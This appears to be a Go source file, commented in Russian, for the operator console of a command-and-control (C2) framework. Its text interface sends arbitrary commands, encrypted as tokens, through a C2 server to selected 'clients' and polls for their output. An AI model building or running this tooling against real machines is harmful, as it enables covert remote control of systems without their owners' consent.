// Package main - терминал оператора с TUI интерфейсом.
// Поддерживает выбор клиента, историю команд и красивый вывод.
package main

import (
	"bytes"
	"c2-project/internal/crypto"
	"c2-project/internal/models"
	"c2-project/internal/protocol"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/charmbracelet/bubbles/textinput"
	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
)

// TerminalConfig - структура конфигурации терминала.
type TerminalConfig struct {
	ServerURL string `json:"server_url"`
}

var config TerminalConfig
var configFile = "configs/terminal.json" // По умолчанию для Docker

// resultMsg - сообщение с результатом выполнения команды
type resultMsg struct {
	result string
	status string
	err    error
}

// Состояние приложения
type model struct {
	input    textinput.Model
	history  []string
	command  string
	result   string
	status   string
	clientID string
	taskID   string
	waiting  bool
	cursor   int
	clients  []string
	showHelp bool
	ready    bool
	width    int
	height   int
}

// Стили
var (
	titleStyle = lipgloss.NewStyle().
			Bold(true).
			Foreground(lipgloss.Color("#7D56F4")).
			Padding(0, 1)

	successStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#04B575"))

	errorStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#FF4672"))

	infoStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#3B82F6"))

	helpStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#8B93A7")).
			Italic(true)

	boxStyle = lipgloss.NewStyle().
			BorderStyle(lipgloss.RoundedBorder()).
			BorderForeground(lipgloss.Color("#7D56F4")).
			Padding(0, 1)

	resultBoxStyle = lipgloss.NewStyle().
			BorderStyle(lipgloss.RoundedBorder()).
			BorderForeground(lipgloss.Color("#04B575")).
			Padding(0, 1)

	statusStyle = lipgloss.NewStyle()

	clientStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#F59E0B")).
			Bold(true)
)

func main() {
	// Проверяем аргумент -local для локального запуска
	for i := 1; i < len(os.Args); i++ {
		if os.Args[i] == "-local" {
			configFile = "configs/terminal.local.json"
			break
		}
	}

	// Загружаем конфигурацию
	if err := loadConfig(); err != nil {
		fmt.Printf("[WARN] Failed to load config: %v\n", err)
		fmt.Println("[INFO] Using default server URL: http://localhost:8080")
		config.ServerURL = "http://localhost:8080"
	}

	// Загружаем историю
	loadHistory()

	// Создаём модель
	m := initialModel()

	// Запускаем TUI
	p := tea.NewProgram(m, tea.WithAltScreen(), tea.WithMouseCellMotion())
	if _, err := p.Run(); err != nil {
		log.Fatal(err)
	}

	// Сохраняем историю при выходе
	saveHistory()
}

func loadConfig() error {
	file, err := os.Open(configFile)
	if err != nil {
		return err
	}
	defer file.Close()

	decoder := json.NewDecoder(file)
	return decoder.Decode(&config)
}

// История команд
var historyFile = "history.log"
var historyData []string

func loadHistory() {
	data, err := os.ReadFile(historyFile)
	if err != nil {
		return
	}
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		if line != "" {
			historyData = append(historyData, line)
		}
	}
	if len(historyData) > 100 {
		historyData = historyData[len(historyData)-100:]
	}
}

func saveHistory() {
	if len(historyData) == 0 {
		return
	}
	content := strings.Join(historyData, "\n")
	os.WriteFile(historyFile, []byte(content), 0644)
}

func addHistory(client, cmd string) {
	entry := fmt.Sprintf("[%s] %s -> %s", time.Now().Format("2006-01-02 15:04:05"), client, cmd)
	historyData = append(historyData, entry)
	if len(historyData) > 100 {
		historyData = historyData[1:]
	}
	saveHistory()
}

func initialModel() model {
	ti := textinput.New()
	ti.Placeholder = "Enter command..."
	ti.Focus()
	ti.CharLimit = 256
	ti.Width = 60

	return model{
		input:    ti,
		history:  make([]string, 0),
		status:   "Ready",
		clientID: "client-001",
		clients:  []string{"client-001", "client-002"},
		waiting:  false,
	}
}

func (m model) Init() tea.Cmd {
	return textinput.Blink
}

func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	var cmds []tea.Cmd

	switch msg := msg.(type) {
	case tea.WindowSizeMsg:
		m.width = msg.Width
		m.height = msg.Height
		m.ready = true

	case resultMsg:
		// Получен результат из горутины
		if msg.err != nil {
			m.status = fmt.Sprintf("Error: %v", msg.err)
		} else {
			m.result = msg.result
			m.status = msg.status
		}
		m.waiting = false
		return m, nil

	case tea.KeyMsg:
		switch msg.String() {
		case "ctrl+c", "q":
			if !m.waiting {
				return m, tea.Quit
			}
		case "enter":
			if m.waiting {
				return m, nil
			}
			cmd := strings.TrimSpace(m.input.Value())
			if cmd == "" {
				return m, nil
			}

			// Обработка специальных команд
			if cmd == "/help" || cmd == "/?" {
				m.showHelp = !m.showHelp
				m.input.SetValue("")
				return m, nil
			}

			if strings.HasPrefix(cmd, "/clients") {
				m.showClients()
				m.input.SetValue("")
				return m, nil
			}

			if strings.HasPrefix(cmd, "/select") {
				parts := strings.Fields(cmd)
				if len(parts) > 1 {
					m.clientID = parts[1]
					m.status = fmt.Sprintf("Selected client: %s", m.clientID)
					m.history = append(m.history, fmt.Sprintf("[Client] %s", m.clientID))
				}
				m.input.SetValue("")
				return m, nil
			}

			if cmd == "/clear" {
				m.history = make([]string, 0)
				m.result = ""
				m.input.SetValue("")
				return m, nil
			}

			// Обычная команда
			m.command = cmd
			m.history = append(m.history, fmt.Sprintf("> %s [%s]", cmd, m.clientID))
			m.status = fmt.Sprintf("Sending command to %s...", m.clientID)
			m.waiting = true
			m.result = ""

			// Сохраняем в историю
			addHistory(m.clientID, cmd)

			m.input.SetValue("")

			// Отправляем команду и возвращаем Cmd для обновления
			return m, m.sendCommandWithResult(cmd)

		default:
			var cmd tea.Cmd
			m.input, cmd = m.input.Update(msg)
			cmds = append(cmds, cmd)
		}
	}

	return m, tea.Batch(cmds...)
}

// sendCommandWithResult - отправляет команду и возвращает tea.Cmd с результатом
func (m *model) sendCommandWithResult(cmd string) tea.Cmd {
	return func() tea.Msg {
		log.Printf("[TUI DEBUG] Sending command: %s, client: %s", cmd, m.clientID)
		log.Printf("[TUI DEBUG] Server URL: %s", config.ServerURL)

		task := models.Task{
			ClientID: m.clientID,
			Command:  cmd,
			Status:   "pending",
		}

		token, err := protocol.EncodeRequest(task)
		if err != nil {
			log.Printf("[TUI DEBUG] Encryption error: %v", err)
			return resultMsg{err: fmt.Errorf("encryption error: %v", err)}
		}
		log.Printf("[TUI DEBUG] Token generated successfully")

		jsonData, _ := json.Marshal(map[string]interface{}{})

		client := &http.Client{}
		reqHTTP, err := http.NewRequest("POST", config.ServerURL+"/api/tasks", bytes.NewReader(jsonData))
		if err != nil {
			log.Printf("[TUI DEBUG] Request creation error: %v", err)
			return resultMsg{err: fmt.Errorf("request error: %v", err)}
		}
		reqHTTP.Header.Set("Authorization", "Bearer "+token)
		reqHTTP.Header.Set("Content-Type", "application/json")

		log.Printf("[TUI DEBUG] Sending POST to: %s/api/tasks", config.ServerURL)

		resp, err := client.Do(reqHTTP)
		if err != nil {
			log.Printf("[TUI DEBUG] HTTP request error: %v", err)
			return resultMsg{err: fmt.Errorf("send error: %v", err)}
		}
		defer resp.Body.Close()

		log.Printf("[TUI DEBUG] Response status: %s", resp.Status)

		var result map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&result)

		taskID, _ := result["task_id"].(string)
		log.Printf("[TUI DEBUG] Task ID received: %s", taskID)

		if taskID == "" {
			log.Printf("[TUI DEBUG] Empty task ID received, waiting for result...")
		}

		// Ждём результат
		for i := 0; i < 30; i++ {
			time.Sleep(1 * time.Second)

			log.Printf("[TUI DEBUG] Polling for result (attempt %d/30)", i+1)

			resp2, err := http.Get(fmt.Sprintf("%s/api/result?task_id=%s", config.ServerURL, taskID))
			if err != nil {
				log.Printf("[TUI DEBUG] Poll request error: %v", err)
				continue
			}

			var result2 map[string]interface{}
			json.NewDecoder(resp2.Body).Decode(&result2)
			resp2.Body.Close()

			status, _ := result2["status"].(string)
			log.Printf("[TUI DEBUG] Poll status: %s", status)

			if status == "completed" {
				resultText, _ := result2["result"].(string)
				log.Printf("[TUI DEBUG] Result received")

				// Очищаем от лишних символов (Windows CRLF -> LF)
				resultText = strings.TrimSpace(resultText)
				resultText = strings.ReplaceAll(resultText, "\r\n", "\n")

				// Проверяем сжатие
				isCompressed := len(resultText) > 0 && (resultText[0] == '\x1f' || resultText[0] == 0x1f)
				if isCompressed {
					decompressed, err := crypto.Decompress([]byte(resultText))
					if err == nil {
						log.Printf("[TUI DEBUG] Decompressed successfully")
						return resultMsg{result: string(decompressed), status: fmt.Sprintf("Command executed on %s", m.clientID)}
					}
					log.Printf("[TUI DEBUG] Decompression failed, returning raw")
				}

				log.Printf("[TUI DEBUG] Result length: %d", len(resultText))
				return resultMsg{result: resultText, status: fmt.Sprintf("Command executed on %s", m.clientID)}
			} else if status == "failed" {
				log.Printf("[TUI DEBUG] Task failed")
				return resultMsg{status: "Command execution failed"}
			}
		}
		log.Printf("[TUI DEBUG] Timeout waiting for result")
		return resultMsg{status: "Timeout: result not received in 30 seconds"}
	}
}

func (m *model) showClients() {
	m.history = append(m.history, "Available clients:")
	m.history = append(m.history, fmt.Sprintf("  - %s (current)", m.clientID))
	for _, c := range m.clients {
		if c != m.clientID {
			m.history = append(m.history, fmt.Sprintf("  - %s", c))
		}
	}
	m.history = append(m.history, "Use /select <client_id> to switch")
}

func (m model) View() string {
	if !m.ready {
		return "Loading..."
	}

	var content strings.Builder

	// Заголовок
	title := titleStyle.Render("C2 Terminal Operator v2.0")
	content.WriteString(title + "\n\n")

	// Статус
	status := statusStyle.Render(m.status)
	content.WriteString(status + "\n\n")

	// История (последние 10 строк)
	if len(m.history) > 0 {
		start := 0
		if len(m.history) > 10 {
			start = len(m.history) - 10
		}
		for _, h := range m.history[start:] {
			content.WriteString("  " + h + "\n")
		}
		content.WriteString("\n")
	}

	// Результат (с обрезанием по длине и высоте)
	if m.result != "" {
		displayResult := m.result
		// Обрезаем по длине (максимум 2000 символов)
		if len(displayResult) > 2000 {
			displayResult = displayResult[:2000] + "\n... (обрезка)"
		}
		// Обрезаем по количеству строк (максимум 20 строк)
		lines := strings.Split(displayResult, "\n")
		if len(lines) > 20 {
			lines = lines[:20]
			displayResult = strings.Join(lines, "\n") + "\n... (ещё строки обрезаны)"
		}
		resultBox := resultBoxStyle.Render(displayResult)
		content.WriteString(resultBox + "\n\n")
	}

	// Информация о клиенте
	clientInfo := clientStyle.Render("Client: " + m.clientID)
	content.WriteString(clientInfo + "\n")

	// Ввод
	content.WriteString(m.input.View() + "\n\n")

	// Помощь
	if m.showHelp {
		help := helpStyle.Render(`/help или /? - показать помощь
/clients - список клиентов
/select <id> - выбрать клиента
/clear - очистить историю
q или Ctrl+C - выход`)
		content.WriteString(help + "\n")
	} else {
		content.WriteString(helpStyle.Render("Enter /help for help") + "\n")
	}

	// Подвал
	footer := fmt.Sprintf("Clients: %d | History: %d", len(m.clients), len(historyData))
	content.WriteString("\n" + helpStyle.Render(footer))

	return boxStyle.Width(m.width - 4).Render(content.String())
}

func (m *model) refreshClients() {
	m.clients = []string{"client-001"}
}
